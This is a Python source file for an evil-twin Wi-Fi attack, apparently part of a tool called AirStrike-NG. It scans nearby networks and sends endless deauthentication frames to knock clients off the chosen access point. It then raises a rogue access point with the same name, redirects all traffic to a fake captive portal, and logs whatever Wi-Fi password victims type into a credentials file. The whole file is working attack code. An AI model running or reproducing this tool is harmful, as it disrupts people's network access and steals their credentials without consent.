# evil_twin.py
import os
import subprocess
import time
import re
from flask import Flask, request, redirect, send_file
from threading import Thread

attack_processes = []
saved_essid = ""  # Global ESSID storage

def scan_networks(adapter):
    print("\n[*] Scanning for networks...\n")
    command = f"sudo timeout 10 airodump-ng {adapter} --write /tmp/scan --output-format csv"
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    csv_file = "/tmp/scan-01.csv"
    networks = []
    try:
        with open(csv_file, "r") as file:
            lines = file.readlines()
        for line in lines[2:]:
            fields = line.split(',')
            if len(fields) > 13:
                bssid = fields[0].strip()
                power = fields[8].strip()
                channel = fields[3].strip()
                encryption = fields[5].strip()
                wps = "yes" if "WPA" in encryption else "no"
                essid = fields[13].strip() or "<Hidden>"
                clients = fields[10].strip() if fields[10].strip().isdigit() else "0"
                index = len(networks) + 1
                networks.append((index, bssid, channel, essid, encryption, power, wps, clients))
        print("\n{:<4} {:<20} {:<4} {:<20} {:<8} {:<6} {:<4} {:<6}".format(
            "NUM", "BSSID", "CH", "ESSID", "ENCR", "PWR", "WPS", "CLIENT"))
        print("=" * 100)
        for net in networks:
            print("{:<4} {:<20} {:<4} {:<20} {:<8} {:<6} {:<4} {:<6}".format(*net))
    except FileNotFoundError:
        print("[!] Error: No scan data found. Ensure your adapter is in monitor mode.")
    return networks

def choose_target(networks):
    while True:
        try:
            choice = int(input("\nSelect target (1-{}): ".format(len(networks))))
            if 1 <= choice <= len(networks):
                return networks[choice - 1]
            else:
                print("Invalid selection. Choose a valid number.")
        except ValueError:
            print("Please enter a valid number.")

def start_portal_server():
    global saved_essid
    app = Flask(__name__)

    @app.route('/')
    def index():
        return open("index.html").read()

    @app.route('/login', methods=['POST'])
    def login():
        global saved_essid
        password = request.form.get('password') or request.form.get('admin_pass')
        with open("/home/kali/Desktop/AirStrike-NG/creds.txt", "a") as f:
            f.write(f"[+] SSID: {saved_essid} | Password: {password}\n")
        return redirect("/success")

    @app.route('/success')
    def success():
        return """
        <html><head><title>Connected</title></head>
        <body style='text-align:center;'>
        <h2>You are now connected to the Internet.</h2>
        <p>You may close this window.</p>
        </body></html>
        """

    @app.route('/generate_204')
    @app.route('/hotspot-detect.html')
    @app.route('/connecttest.txt')
    @app.route('/ncsi.txt')
    @app.route('/redirect')
    def portal_trigger():
        return redirect("/")

    @app.route('/we.png')
    def serve_logo():
        return send_file("/home/kali/Desktop/AirStrike-NG/we.png", mimetype="image/png")

    app.run(host="0.0.0.0", port=80)

def start_deauth_attack(bssid, interface):
    print("[+] Starting deauthentication attack on real AP...")
    command = f"aireplay-ng --deauth 0 -a {bssid} {interface} --ignore-negative-one"
    proc = subprocess.Popen(command, shell=True)
    attack_processes.append(proc)

def evil_twin_attack(adapter):
    global saved_essid
    os.system("clear")
    networks = scan_networks(adapter)
    if not networks:
        return
    target = choose_target(networks)
    _, bssid, channel, essid, _, _, _, _ = target
    saved_essid = essid
    start_deauth_attack(bssid, adapter)

    print(f"\n[*] Launching Evil Twin attack on '{essid}' (Channel {channel})")
    print("[+] Enabling monitor mode...")
    subprocess.call(f"airmon-ng start {adapter}", shell=True)

    with open("hostapd.conf", "w") as f:
        f.write(f"""
interface={adapter}
driver=nl80211
ssid={essid}
channel={channel}
""")

    print("[+] Starting Rogue Access Point...")
    hostapd = subprocess.Popen("hostapd hostapd.conf", shell=True)
    attack_processes.append(hostapd)
    time.sleep(3)

    print("[+] Starting dnsmasq...")
    with open("dnsmasq.conf", "w") as f:
        f.write(f"""
interface={adapter}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
""")
    dnsmasq = subprocess.Popen("dnsmasq -C dnsmasq.conf", shell=True)
    attack_processes.append(dnsmasq)

    subprocess.call(f"ifconfig {adapter} up 10.0.0.1 netmask 255.255.255.0", shell=True)
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

    print("[+] Configuring iptables redirection...")
    subprocess.call("iptables --flush", shell=True)
    subprocess.call("iptables -t nat --flush", shell=True)
    subprocess.call("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80", shell=True)
    subprocess.call("iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)

    print("[+] Launching captive portal...")
    portal_thread = Thread(target=start_portal_server)
    portal_thread.daemon = True
    portal_thread.start()
    attack_processes.append(portal_thread)

    print("\n[✓] Evil Twin Attack is running!")
    print("[*] Wait for a victim to connect and enter Wi-Fi password.")

def stop_evil_twin():
    print("[+] Stopping Evil Twin components...")
    subprocess.call("pkill hostapd", shell=True)
    subprocess.call("pkill dnsmasq", shell=True)
    subprocess.call("pkill -f flask", shell=True)
    subprocess.call("iptables --flush", shell=True)
    subprocess.call("iptables -t nat --flush", shell=True)
    for proc in attack_processes:
        if isinstance(proc, subprocess.Popen):
            proc.terminate()
    print("[✓] Evil Twin stopped. Restore adapter manually if needed.")
